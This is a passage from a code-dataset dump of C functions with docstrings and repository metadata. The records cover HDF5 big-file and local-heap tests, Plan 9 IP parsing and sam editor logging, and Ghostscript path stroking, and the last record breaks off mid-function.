bug#921\n     *  H5Dcreate with H5P_DEFAULT creation properties\n     *  will create a set of solid 1GB files; test will crash if quotas are enforced\n     *  or it will take some time to write a file.\n     *  We should create a dataset allocating space late and never writing fill values.\n     *  EIP 4/8/03\n     */\n    dcpl = H5Pcreate(H5P_DATASET_CREATE);\n    H5Pset_alloc_time(dcpl, H5D_ALLOC_TIME_LATE);\n    H5Pset_fill_time(dcpl, H5D_FILL_TIME_NEVER);\n    if((d1 = H5Dcreate2(file, \"d1\", H5T_NATIVE_INT, space1, H5P_DEFAULT, dcpl, H5P_DEFAULT)) < 0 ||\n            (d2 = H5Dcreate2(file, \"d2\", H5T_NATIVE_INT, space2, H5P_DEFAULT, dcpl, H5P_DEFAULT)) < 0) {\n        goto error;\n    }\n\n\n    /* Write some things to them randomly */\n    hs_size[0] = WRT_SIZE;\n    if ((mem_space = H5Screate_simple (1, hs_size, hs_size)) < 0) goto error;\n    for (i=0; i<wrt_n; i++) {\n\t/* start position must be at least hs_size from the end */\n        hs_start[0] = randll (size2[0]-hs_size[0], i);\n        HDfprintf (out, \"#%03d 0x%016Hx\\n\", i, hs_start[0]);\n        if (H5Sselect_hyperslab (space2, H5S_SELECT_SET, hs_start, NULL,\n                hs_size, NULL) < 0) goto error;\n        for (j=0; j<WRT_SIZE; j++) {\n            buf[j] = i+1;\n        }\n        if (H5Dwrite (d2, H5T_NATIVE_INT, mem_space, space2,\n                H5P_DEFAULT, buf) < 0) goto error;\n    }\n\n    if (H5Dclose (d1) < 0) goto error;\n    if (H5Dclose (d2) < 0) goto error;\n    if (H5Sclose (mem_space) < 0) goto error;\n    if (H5Sclose (space1) < 0) goto error;\n    if (H5Sclose (space2) < 0) goto error;\n    if (H5Fclose (file) < 0) goto error;\n    HDfree (buf);\n    HDfclose(out);\n    PASSED();\n    return 0;\n\nerror:\n    H5E_BEGIN_TRY {\n        H5Dclose(d1);\n        H5Dclose(d2);\n        H5Sclose(space1);\n        H5Sclose(space2);\n        H5Sclose(mem_space);\n        H5Fclose(file);\n    } H5E_END_TRY;\n    if (buf) HDfree(buf);\n    if (out) HDfclose(out);\n    return 1;\n}", "path": "rnnlib/hdf5_snap/test/big.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\tis_sparse\n *\n * Purpose:\tDetermines if the file system of the current working\n *\t\tdirectory supports holes.\n *\n * Return:\tSuccess:\tNon-zero if holes are supported; zero\n *\t\t\t\totherwise.\n *\n *\t\tFailure:\tzero\n *\n * Programmer:\tRobb Matzke\n *              Wednesday, July 15, 1998\n *\n * Modifications:\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "static int\nis_sparse(void)", "code": "{\n    int\t\tfd;\n    h5_stat_t\tsb;\n\n    if ((fd=HDopen(\"x.h5\", O_RDWR|O_TRUNC|O_CREAT, 0666)) < 0) return 0;\n    if (HDlseek(fd, (off_t)(1024*1024), SEEK_SET)!=1024*1024) return 0;\n    if (5!=HDwrite(fd, \"hello\", (size_t)5)) return 0;\n    if (HDclose(fd) < 0) return 0;\n    if (HDstat(\"x.h5\", &sb) < 0) return 0;\n    if (HDremove(\"x.h5\") < 0) return 0;\n#ifdef H5_HAVE_STAT_ST_BLOCKS\n    return ((unsigned long)sb.st_blocks*512 < (unsigned long)sb.st_size);\n#else\n    return (0);\n#endif\n}", "path": "rnnlib/hdf5_snap/test/big.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\tenough_room\n *\n * Purpose:\tTries to create a bunch of sparse files to see if quotas will\n *\t\tget in the way.  Some systems also have problems opening\n *\t\tenough files and we'll check that too.\n *\n * Return:\tSuccess:\tNon-zero\n *\n *\t\tFailure:\tzero\n *\n * Programmer:\tRobb Matzke\n *              Thursday, August  6, 1998\n *\n * Modifications:\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "static int\nenough_room(hid_t fapl)", "code": "{\n    int\t\tret_value=0;\n    int\t\tfd[68];\n    size_t\ti, size = (size_t)1 << 30;\n    char\tfilename[1024], name[1024];\n\n    /* Initialize file descriptors */\n    for (i=0; i<NELMTS(fd); i++) fd[i] = -1;\n\n    /* Get file name template */\n    HDassert(H5FD_FAMILY==H5Pget_driver(fapl));\n    h5_fixname(FILENAME[0], fapl, filename, sizeof(filename));\n\n    /* Create files */\n    for (i=0; i<NELMTS(fd); i++) {\n        HDsnprintf(name, sizeof(name), filename, i);\n        if ((fd[i]=HDopen(name, O_RDWR|O_CREAT|O_TRUNC, 0666)) < 0) {\n            goto done;\n        }\n        if ((off_t)size != HDlseek(fd[i], (off_t)size, SEEK_SET)) {\n            goto done;\n        }\n        if (1!=HDwrite(fd[i], \"X\", (size_t)1)) {\n            goto done;\n        }\n    }\n    ret_value = 1;\n\ndone:\n    for (i=0; i<NELMTS(fd) && fd[i]>=0; i++) {\n        HDsnprintf(name, sizeof(name), filename, i);\n        if(HDclose(fd[i]) < 0)\n            ret_value=0;\n        HDremove(name);\n    }\n\n    return ret_value;\n}", "path": "rnnlib/hdf5_snap/test/big.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/* end test_stdio() */\n", "func_signal": "static int\ntest_family(hid_t fapl)", "code": "{\n    char\tfilename[1024];\n\n    /* Test huge file with the family driver */\n    HDputs(\"Testing big file with the Family Driver \");\n    if((fapl = H5Pcreate(H5P_FILE_ACCESS)) < 0)\n        goto error;\n\n    if(H5Pset_fapl_family(fapl, family_size_def, H5P_DEFAULT) < 0)\n        goto error;\n\n    if(cflag){\n        /*\n         * We shouldn't run this test if the file system doesn't support holes\n         * because we would generate multi-gigabyte files.\n         */\n        HDputs(\"Checking if file system is adequate for this test...\");\n        if(sizeof(long long) < 8 || 0 == GB8LL) {\n            HDputs(\"Test skipped because sizeof(long long) is too small. This\");\n            HDputs(\"hardware apparently doesn't support 64-bit integer types.\");\n            usage();\n            goto quit;\n        }\n        if(!sparse_support) {\n            HDputs(\"Test skipped because file system does not support holes.\");\n            usage();\n            goto quit;\n        }\n        if(!enough_room(fapl)) {\n            HDputs(\"Test skipped because of quota (file size or num open files).\");\n            usage();\n            goto quit;\n        }\n    }\n\n    /* Do the test with the Family Driver */\n    h5_fixname(FILENAME[0], fapl, filename, sizeof filename);\n\n    if(writer(filename, fapl, HUGEFILE, WRT_N))\n        goto error;\n    if(reader(filename, fapl))\n        goto error;\n\n    HDputs(\"Test passed with the Family Driver.\");\n\nquit:\n    /* End with normal return code */\n    /* Clean up the test file */\n    if(h5_cleanup(FILENAME, fapl))\n        HDremove(DNAME);\n    return 0;\n\nerror:\n    HDputs(\"*** TEST FAILED ***\");\n    return 1;\n}", "path": "rnnlib/hdf5_snap/test/big.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\tH5HL_new\n *\n * Purpose:\tCreate a new local heap object\n *\n * Return:\tSuccess:\tnon-NULL pointer to new local heap\n *\t\tFailure:\tNULL\n *\n * Programmer:\tQuincey Koziol\n *\t\tkoziol@hdfgroup.org\n *\t\tJan  5 2010\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "H5HL_t *\nH5HL_new(size_t sizeof_size, size_t sizeof_addr, size_t prfx_size)", "code": "{\n    H5HL_t *heap = NULL;        /* New local heap */\n    H5HL_t *ret_value;          /* Return value */\n\n    FUNC_ENTER_NOAPI(NULL)\n\n    /* check arguments */\n    HDassert(sizeof_size > 0);\n    HDassert(sizeof_addr > 0);\n    HDassert(prfx_size > 0);\n\n    /* Allocate new local heap structure */\n    if(NULL == (heap = H5FL_CALLOC(H5HL_t)))\n\tHGOTO_ERROR(H5E_HEAP, H5E_CANTALLOC, NULL, \"memory allocation failed\")\n\n    /* Initialize non-zero fields */\n    heap->sizeof_size = sizeof_size;\n    heap->sizeof_addr = sizeof_addr;\n    heap->prfx_size = prfx_size;\n\n    /* Set the return value */\n    ret_value = heap;\n\ndone:\n    FUNC_LEAVE_NOAPI(ret_value)\n}", "path": "rnnlib/hdf5_snap/src/H5HLint.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\tmain\n *\n * Purpose:\n *\n * Return:\tSuccess:\n *\n *\t\tFailure:\n *\n * Programmer:\tQuincey Koziol\n *              Friday, January  3, 2003\n *\n * Modifications:\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "int\nmain(void)", "code": "{\n    hid_t\tfile, space, dset, dcpl;\n    herr_t      ret;\n    unsigned rank=SPACE_RANK;    /* Rank of dataspace */\n    hsize_t big_dims[SPACE_RANK]={SPACE_DIM0,SPACE_DIM1};      /* Large dimensions */\n\n    /* Create the file */\n    file = H5Fcreate(TESTFILE, H5F_ACC_TRUNC, H5P_DEFAULT, H5P_DEFAULT);\n    if(file<0)\n        printf(\"file<0!\\n\");\n\n    /* Create the dataspace (for dataset) */\n    space = H5Screate_simple(rank,big_dims,NULL);\n    if(space<0)\n        printf(\"space<0!\\n\");\n\n    /* Create a dataset creation property list */\n    dcpl = H5Pcreate(H5P_DATASET_CREATE);\n    if(dcpl<0)\n        printf(\"dcpl<0!\\n\");\n\n    /* Make certain that the dataset's storage doesn't get allocated :-) */\n    ret = H5Pset_alloc_time(dcpl,H5D_ALLOC_TIME_LATE);\n    if(ret<0)\n        printf(\"H5Pset_alloc_time() failed!\\n\");\n\n    /* Create the dataset with deferred storage allocation */\n    dset = H5Dcreate2(file, \"Dataset\", H5T_NATIVE_INT, space, H5P_DEFAULT, dcpl, H5P_DEFAULT);\n    if(dset<0)\n        printf(\"dset<0!\\n\");\n\n    H5Dclose(dset);\n    H5Sclose(space);\n    H5Pclose(dcpl);\n    H5Fclose(file);\n\n    return 0;\n}", "path": "rnnlib/hdf5_snap/test/gen_old_layout.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\tH5HL_dec_rc\n *\n * Purpose:\tDecrement ref. count on heap\n *\n * Return:\tSuccess:\tNon-negative\n *\t\tFailure:\tNegative\n *\n * Programmer:\tQuincey Koziol\n *\t\tkoziol@hdfgroup.org\n *\t\tOct 12 2008\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "static herr_t\nH5HL_dec_rc(H5HL_t *heap)", "code": "{\n    FUNC_ENTER_NOAPI_NOINIT_NOERR\n\n    /* check arguments */\n    HDassert(heap);\n\n    /* Decrement heap's ref. count */\n    heap->rc--;\n\n    /* Check if we should destroy the heap */\n    if(heap->rc == 0)\n        H5HL_dest(heap);\n\n    FUNC_LEAVE_NOAPI(SUCCEED)\n}", "path": "rnnlib/hdf5_snap/src/H5HLint.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/* Create matching Fortran and C types by writing to both files */\n", "func_signal": "void writeToFiles(const char* fortran_type, const char* c_type, int size, unsigned int kind)", "code": "{\n  fprintf(fort_header, \"        INTEGER, PARAMETER :: %s = %u\\n\", fortran_type, kind);\n  fprintf(c_header, \"typedef c_int_%d %s;\\n\", size, c_type);\n}", "path": "rnnlib/hdf5_snap/fortran/src/H5match_types.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/* Call this function if there is no matching C type for sizes > 1 */\n", "func_signal": "void writeTypedefDefault(unsigned int size)", "code": "{\n  assert(size %2 == 0);\n\n  fprintf(c_header, \"typedef struct {c_int_%u a; c_int_%u b;} c_int_%u\\n\", size / 2, size / 2, size);\n}", "path": "rnnlib/hdf5_snap/fortran/src/H5match_types.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\tsupports_big\n *\n * Purpose:\tDetermines if the file system of the current working\n *\t\tdirectory supports big files.\n *\n * Return:\tSuccess:\tNon-zero if big files are supported; zero\n *\t\t\t\totherwise.\n *\n *\t\tFailure:\tzero\n *\n * Programmer:\tRaymond Lu\n *              Wednesday, April 18, 2007\n *\n * Modifications:\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "static fsizes_t\nsupports_big(void)", "code": "{\n    int\t\tfd = -1;\n    fsizes_t    fsize = NOFILE;\n\n    if((fd=HDopen(\"y.h5\", O_RDWR|O_TRUNC|O_CREAT, 0666)) < 0)\n        goto error;\n\n    /* Write a few byte at the beginning */\n    if(5!=HDwrite(fd, \"hello\", (size_t)5))\n        goto quit;\n    fsize = SFILE;\n\n    /* Write a few bytes at 2GB */\n    if(HDlseek(fd, 2*GB, SEEK_SET)!=2*GB)\n        goto quit;\n    if(5!=HDwrite(fd, \"hello\", (size_t)5))\n        goto quit;\n    fsize = LFILE;\n\n    /* Write a few bytes at 4GB */\n    if(HDlseek(fd, 4*GB, SEEK_SET) != 4*GB)\n        goto quit;\n    if(5!=HDwrite(fd, \"hello\", (size_t)5))\n        goto quit;\n    fsize = XLFILE;\n\n    /* If this supports sparse_file, write a few bytes at 32GB */\n    if(!sparse_support)\n        goto quit;\n    if(HDlseek(fd, 32*GB, SEEK_SET) != 32*GB)\n        goto quit;\n    if(5!=HDwrite(fd, \"hello\", (size_t)5))\n        goto quit;\n    fsize = HUGEFILE;\n\nquit:\n    if(HDclose(fd) < 0)\n        goto error;\n    if(HDremove(\"y.h5\") < 0)\n        goto error;\n    return fsize;\n\nerror:\n    if(fd >= 0){\n        HDclose(fd);\n        HDremove(\"y.h5\");\n    }\n    return fsize;\n}", "path": "rnnlib/hdf5_snap/test/big.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*\n * `from' may contain an address followed by other characters,\n * at least in /boot, so we permit whitespace (and more) after the address.\n * we do ensure that \"delete\" cannot be parsed as \"de::\".\n *\n * some callers don't check the return value for errors, so\n * set `to' to something distinctive in the case of a parse error.\n */\n", "func_signal": "vlong\nparseip(uchar *to, char *from)", "code": "{\n\tint i, elipsis = 0, v4 = 1;\n\tulong x;\n\tchar *p, *op;\n\n\tmemset(to, 0, IPaddrlen);\n\tp = from;\n\tfor(i = 0; i < IPaddrlen && ipcharok(*p); i+=2){\n\t\top = p;\n\t\tx = strtoul(p, &p, 16);\n\t\tif(*p == '.' || (*p == 0 && i == 0)){\t/* ends with v4? */\n\t\t\tp = v4parseip(to+i, op);\n\t\t\ti += 4;\n\t\t\tbreak;\n\t\t}\n\t\t/* v6: at most 4 hex digits, followed by colon or delim */\n\t\tif(x != (ushort)x || *p != ':' && !delimchar(*p)) {\n\t\t\tmemset(to, 0, IPaddrlen);\n\t\t\treturn -1;\t\t\t/* parse error */\n\t\t}\n\t\tto[i] = x>>8;\n\t\tto[i+1] = x;\n\t\tif(*p == ':'){\n\t\t\tv4 = 0;\n\t\t\tif(*++p == ':'){\t/* :: is elided zero short(s) */\n\t\t\t\tif (elipsis) {\n\t\t\t\t\tmemset(to, 0, IPaddrlen);\n\t\t\t\t\treturn -1;\t/* second :: */\n\t\t\t\t}\n\t\t\t\telipsis = i+2;\n\t\t\t\tp++;\n\t\t\t}\n\t\t} else if (p == op)\t\t/* strtoul made no progress? */\n\t\t\tbreak;\n\t}\n\tif (p == from || !delimchar(*p)) {\n\t\tmemset(to, 0, IPaddrlen);\n\t\treturn -1;\t\t\t\t/* parse error */\n\t}\n\tif(i < IPaddrlen){\n\t\tmemmove(&to[elipsis+IPaddrlen-i], &to[elipsis], i-elipsis);\n\t\tmemset(&to[elipsis], 0, IPaddrlen-i);\n\t}\n\tif(v4){\n\t\tto[10] = to[11] = 0xff;\n\t\treturn nhgetl(to + IPv4off);\n\t} else\n\t\treturn 6;\n}", "path": "plan9/nix/sys/src/libip/parseip.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/*\n * like fileundelete, but get the data from arguments\n */\n", "func_signal": "void\nloginsert(File *f, uint p0, Rune *s, uint ns)", "code": "{\n\tif(f->rescuing)\n\t\treturn;\n\tif(ns == 0)\n\t\treturn;\n\tif(ns>STRSIZE)\n\t\tpanic(\"loginsert\");\n\tif(f->seq < seq)\n\t\tfilemark(f);\n\tif(p0 < f->hiposn)\n\t\terror(Esequence);\n\n\tif(merge.f != f\n\t|| p0-(merge.p0+merge.n)>Maxmerge\t\t\t/* too far */\n\t|| merge.nbuf+((p0+ns)-(merge.p0+merge.n))>=RBUFSIZE)\t/* too long */\n\t\tflushmerge();\n\n\tif(ns>=RBUFSIZE){\n\t\tif(!(merge.n == 0 && merge.nbuf == 0 && merge.f == nil))\n\t\t\tpanic(\"loginsert bad merge state\");\n\t\twrinsert(&f->epsilon, f->seq, TRUE, p0, s, ns);\n\t}else{\n\t\tif(merge.f != f){\n\t\t\tmerge.f = f;\n\t\t\tmerge.p0 = p0;\n\t\t\tmerge.seq = f->seq;\n\t\t}\n\t\tmergeextend(f, p0);\n\n\t\t/* append string to merge */\n\t\trunemove(merge.buf+merge.nbuf, s, ns);\n\t\tmerge.nbuf += ns;\n\t}\n\n\tf->hiposn = p0;\n\tif(!f->unread && !f->mod)\n\t\tstate(f, Dirty);\n}", "path": "plan9/sys/src/cmd/sam/file.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/*\n * Stroke a path.  If to_path != 0, append the stroke outline to it;\n * if to_path == 0, draw the strokes on dev.\n *\n * Note that gx_stroke_path_only with to_path != NULL may clip the path to\n * the clipping path, as for to_path == NULL.  This is almost never\n * what is wanted.\n */\n", "func_signal": "private int\ngx_stroke_path_only_aux(gx_path * ppath, gx_path * to_path, gx_device * pdev,\n\t       const gs_imager_state * pis, const gx_stroke_params * params,\n\t\t const gx_device_color * pdevc, const gx_clip_path * pcpath)", "code": "{\n    stroke_line_proc_t line_proc =\n\t(to_path == 0 ? stroke_fill : stroke_add);\n    gs_fixed_rect ibox, cbox;\n    gx_device_clip cdev;\n    gx_device *dev = pdev;\n    int code = 0;\n    gx_fill_params fill_params;\n    const gx_line_params *pgs_lp = gs_currentlineparams_inline(pis);\n    int dash_count = pgs_lp->dash.pattern_size;\n    gx_path fpath, dpath;\n    gx_path stroke_path_body;\n    const gx_path *spath;\n    float xx = pis->ctm.xx, xy = pis->ctm.xy;\n    float yx = pis->ctm.yx, yy = pis->ctm.yy;\n    /*\n     * We are dealing with a reflected coordinate system\n     * if transform(1,0) is counter-clockwise from transform(0,1).\n     * See the note in stroke_add for the algorithm.\n     */\n    int uniform;\n    bool reflected;\n    orientation orient =\n\t(\n#ifdef OPTIMIZE_ORIENTATION\n\t is_fzero2(xy, yx) ?\n\t (uniform = (xx == yy ? 1 : xx == -yy ? -1 : 0),\n\t  reflected = (uniform ? uniform < 0 : (xx < 0) != (yy < 0)),\n\t  orient_portrait) :\n\t is_fzero2(xx, yy) ?\n\t (uniform = (xy == yx ? -1 : xy == -yx ? 1 : 0),\n\t  reflected = (uniform ? uniform < 0 : (xy < 0) == (yx < 0)),\n\t  orient_landscape) :\n    /* We should optimize uniform rotated coordinate systems */\n    /* here as well, but we don't. */\n#endif\n\t (uniform = 0,\n\t  reflected = xy * yx > xx * yy,\n\t  orient_other));\n    /*\n     * Formerly, there was a hack here that only treated the joins of\n     * flattened curves specially if the dot length was non-zero.\n     * This was a surrogate to detect use of the library by PCL\n     * interpreters.  We have replaced this hack with an explicit\n     * curve join parameter in the graphics state.\n     */\n#if 0\n    segment_notes not_first =\n\t(!is_fzero(pis->line_params.dot_length) ? sn_not_first : sn_none);\n#else\n    const segment_notes not_first = sn_not_first;\n#endif\n    gs_line_join curve_join =\n\t(pgs_lp->curve_join >= 0 ? (gs_line_join)pgs_lp->curve_join :\n\t pgs_lp->join == gs_join_none || pgs_lp->join == gs_join_round ? \n\t    gs_join_bevel : pgs_lp->join);\n    float line_width = pgs_lp->half_width;\t/* (*half* the line width) */\n    bool always_thin;\n    double line_width_and_scale;\n    double device_line_width_scale = 0; /* Quiet compiler. */\n    double device_dot_length = pgs_lp->dot_length * fixed_1;\n    const subpath *psub;\n    gs_matrix initial_matrix;\n    bool initial_matrix_reflected;\n\n    (*dev_proc(pdev, get_initial_matrix)) (pdev, &initial_matrix);\n    initial_matrix_reflected = initial_matrix.xy * initial_matrix.yx > \n\t\t\t       initial_matrix.xx * initial_matrix.yy;\n\n#ifdef DEBUG\n    if (gs_debug_c('o')) {\n\tint count = pgs_lp->dash.pattern_size;\n\tint i;\n\n\tdlprintf3(\"[o]half_width=%f, cap=%d, join=%d,\\n\",\n\t\t  pgs_lp->half_width, (int)pgs_lp->cap, (int)pgs_lp->join);\n\tdlprintf2(\"   miter_limit=%f, miter_check=%f,\\n\",\n\t\t  pgs_lp->miter_limit, pgs_lp->miter_check);\n\tdlprintf1(\"   dash pattern=%d\", count);\n\tfor (i = 0; i < count; i++)\n\t    dprintf1(\",%f\", pgs_lp->dash.pattern[i]);\n\tdputs(\",\\n\");\n\tdlprintf4(\"\\toffset=%f, init(ink_on=%d, index=%d, dist_left=%f)\\n\",\n\t\t  pgs_lp->dash.offset, pgs_lp->dash.init_ink_on,\n\t\t  pgs_lp->dash.init_index, pgs_lp->dash.init_dist_left);\n    }\n#endif\n\n    gx_path_bbox(ppath, &ibox);\n    /* Expand the path bounding box by the scaled line width. */\n    {\n\tgs_fixed_point expansion;\n\n\tif (gx_stroke_path_expansion(pis, ppath, &expansion) < 0) {\n\t    /* The expansion is so large it caused a limitcheck. */\n\t    ibox.p.x = ibox.p.y = min_fixed;\n\t    ibox.q.x = ibox.q.y = max_fixed;\n\t} else {\n\t    expansion.x += pis->fill_adjust.x;\n\t    expansion.y += pis->fill_adjust.y;\n\t    /*\n\t     * It's theoretically possible for the following computations to\n\t     * overflow, so we need to check for this.\n\t     */\n\t    ibox.p.x = (ibox.p.x < min_fixed + expansion.x ? min_fixed :\n\t\t\tibox.p.x - expansion.x);\n\t    ibox.p.y = (ibox.p.y < min_fixed + expansion.y ? min_fixed :\n\t\t\tibox.p.y - expansion.y);\n\t    ibox.q.x = (ibox.q.x > max_fixed - expansion.x ? max_fixed :\n\t\t\tibox.q.x + expansion.x);\n\t    ibox.q.y = (ibox.q.y > max_fixed - expansion.y ? max_fixed :\n\t\t\tibox.q.y + expansion.y);\n\t}\n    }\n    /* Check the expanded bounding box against the clipping regions. */\n    if (pcpath)\n\tgx_cpath_inner_box(pcpath, &cbox);\n    else if (pdevc)\n\t(*dev_proc(dev, get_clipping_box)) (dev, &cbox);\n    else {\n\t/* This is strokepath, not stroke.  Don't clip. */\n\tcbox = ibox;\n    }\n    if (!rect_within(ibox, cbox)) {\n\t/* Intersect the path box and the clip bounding box. */\n\t/* If the intersection is empty, this call is a no-op. */\n\tgs_fixed_rect bbox;\n\n\tif (pcpath) {\n\t    gx_cpath_outer_box(pcpath, &bbox);\n\t    if_debug4('f', \"   outer_box=(%g,%g),(%g,%g)\\n\",\n\t\t      fixed2float(bbox.p.x), fixed2float(bbox.p.y),\n\t\t      fixed2float(bbox.q.x), fixed2float(bbox.q.y));\n\t    rect_intersect(ibox, bbox);\n\t} else\n\t    rect_intersect(ibox, cbox);\n\tif (ibox.p.x >= ibox.q.x || ibox.p.y >= ibox.q.y) {\n\t    /* Intersection of boxes is empty! */\n\t    return 0;\n\t}\n\t/*\n\t * The path is neither entirely inside the inner clip box\n\t * nor entirely outside the outer clip box.\n\t * If we had to flatten the path, this is where we would\n\t * recompute its bbox and make the tests again,\n\t * but we don't bother right now.\n\t *\n\t * If there is a clipping path, set up a clipping device.\n\t */\n\tif (pcpath) {\n\t    gx_make_clip_device(&cdev, gx_cpath_list(pcpath));\n\t    cdev.target = dev;\n\t    cdev.max_fill_band = dev->max_fill_band;\n\t    dev = (gx_device *) & cdev;\n\t    (*dev_proc(dev, open_device)) (dev);\n\t}\n    }\n    fill_params.rule = gx_rule_winding_number;\n    fill_params.flatness = pis->flatness;\n#ifdef USE_FILL_ADJUSTMENT\n    fill_params.fill_zero_width =\n\t(pis->fill_adjust.x | pis->fill_adjust.y) != 0;\n#else\n    fill_params.fill_zero_width = false;\n#endif\n    if (line_width < 0)\n\tline_width = -line_width;\n    line_width_and_scale = line_width * (double)int2fixed(1);\n    if (is_fzero(line_width))\n\talways_thin = true;\n    else {\n\tfloat xa, ya;\n\n\tswitch (orient) {\n\t    case orient_portrait:\n\t\txa = xx, ya = yy;\n\t\tgoto sat;\n\t    case orient_landscape:\n\t\txa = xy, ya = yx;\n\t      sat:\n\t\tif (xa < 0)\n\t\t    xa = -xa;\n\t\tif (ya < 0)\n\t\t    ya = -ya;\n\t\talways_thin = (max(xa, ya) * line_width < 0.5);\n\t\tif (!always_thin && uniform) {\t/* Precompute a value we'll need later. */\n\t\t    device_line_width_scale = line_width_and_scale * xa;\n\t\t}\n\t\tbreak;\n\t    default:\n\t\t{\n\t\t    /* The check is more complicated, but it's worth it. */\n\t\t    double xsq = xx * xx + xy * xy;\n\t\t    double ysq = yx * yx + yy * yy;\n\t\t    double cross = xx * yx + xy * yy;\n\n\t\t    if (cross < 0)\n\t\t\tcross = 0;\n\t\t    always_thin =\n\t\t\t((max(xsq, ysq) + cross) * line_width * line_width\n\t\t\t < 0.25);\n\t\t}\n\t}\n    }\n    if_debug7('o', \"[o]ctm=(%g,%g,%g,%g,%g,%g) thin=%d\\n\",\n\t      xx, xy, yx, yy, pis->ctm.tx, pis->ctm.ty, always_thin);\n    if (device_dot_length != 0) {\n\t/*\n\t * Compute the dot length in device space.  We can't do this\n\t * quite right for non-uniform coordinate systems; too bad.\n\t */\n\tgs_matrix mat;\n\tconst gs_matrix *pmat;\n\n\tif (pgs_lp->dot_length_absolute) {\n\t    gs_deviceinitialmatrix(pdev, &mat);\n\t    pmat = &mat;\n\t} else\n\t    pmat = (const gs_matrix *)&pis->ctm;\n\tdevice_dot_length *= fabs(pmat->xy) + fabs(pmat->yy);\n    }\n    /* Start by flattening the path.  We should do this on-the-fly.... */\n    if (!gx_path_has_curves(ppath)) {\t/* don't need to flatten */\n\tif (!ppath->first_subpath)\n\t    return 0;\n\tspath = ppath;\n    } else {\n\tgx_path_init_local(&fpath, ppath->memory);\n\tif ((code = gx_path_add_flattened_for_stroke(ppath, &fpath,\n\t\t\t\t\t\tparams->flatness, pis)) < 0\n\t    )\n\t    return code;\n\tspath = &fpath;\n    }\n    if (dash_count) {\n\tgx_path_init_local(&dpath, ppath->memory);\n\tcode = gx_path_add_dash_expansion(spath, &dpath, pis);\n\tif (code < 0)\n\t    goto exf;\n\tspath = &dpath;\n    }\n    if (to_path == 0) {\n\t/* We might try to defer this if it's expensive.... */\n\tto_path = &stroke_path_body;\n\tgx_path_init_local(&stroke_path_body, ppath->memory);\n    }\n    for (psub = spath->first_subpath; psub != 0;) {\n\tint index = 0;\n\tconst segment *pseg = (const segment *)psub;\n\tfixed x = pseg->pt.x;\n\tfixed y = pseg->pt.y;\n\tbool is_closed = ((const subpath *)pseg)->is_closed;\n\tpartial_line pl, pl_prev, pl_first;\n\n\twhile ((pseg = pseg->next) != 0 &&\n\t       pseg->type != s_start\n\t    ) {\n\t    /* Compute the width parameters in device space. */\n\t    /* We work with unscaled values, for speed. */\n\t    fixed sx = pseg->pt.x, udx = sx - x;\n\t    fixed sy = pseg->pt.y, udy = sy - y;\n\n\t    pl.o.p.x = x, pl.o.p.y = y;\n\t  d:pl.e.p.x = sx, pl.e.p.y = sy;\n\t    if (!(udx | udy)) {\t/* degenerate */\n\t\t/*\n\t\t * If this is the first segment of the subpath,\n\t\t * check the entire subpath for degeneracy.\n\t\t * Otherwise, ignore the degenerate segment.\n\t\t */\n\t\tif (index != 0)\n\t\t    continue;\n\t\t/* Check for a degenerate subpath. */\n\t\twhile ((pseg = pseg->next) != 0 &&\n\t\t       pseg->type != s_start\n\t\t    ) {\n\t\t    sx = pseg->pt.x, udx = sx - x;\n\t\t    sy = pseg->pt.y, udy = sy - y;\n\t\t    if (udx | udy)\n\t\t\tgoto d;\n\t\t}\n\t\t/*\n\t\t * The entire subpath is degenerate, but it includes\n\t\t * more than one point.  If the dot length is non-zero,\n\t\t * draw the caps, otherwise do nothing.\n\t\t */\n\t\tif (pgs_lp->dot_length != 0)\n\t\t    break;\n\t\tif (pgs_lp->cap != gs_cap_round) {\n\t\t    /* From PLRM, stroke operator :\n\t\t       If a subpath is degenerate (consists of a single-point closed path \n\t\t       or of two or more points at the same coordinates), \n\t\t       stroke paints it only if round line caps have been specified */\n\t\t    break;\n\t\t}\n\t\t/*\n\t\t * Orient the dot according to the previous segment if\n\t\t * any, or else the next segment if any, or else\n\t\t * according to the specified dot orientation.\n\t\t */\n\t\t{\n\t\t    const segment *end = psub->prev;\n\n\t\t    if (end != 0 && (end->pt.x != x || end->pt.y != y))\n\t\t\tsx = end->pt.x, sy = end->pt.y;\n\t\t    else if (pseg != 0 &&\n\t\t\t     (pseg->pt.x != x || pseg->pt.y != 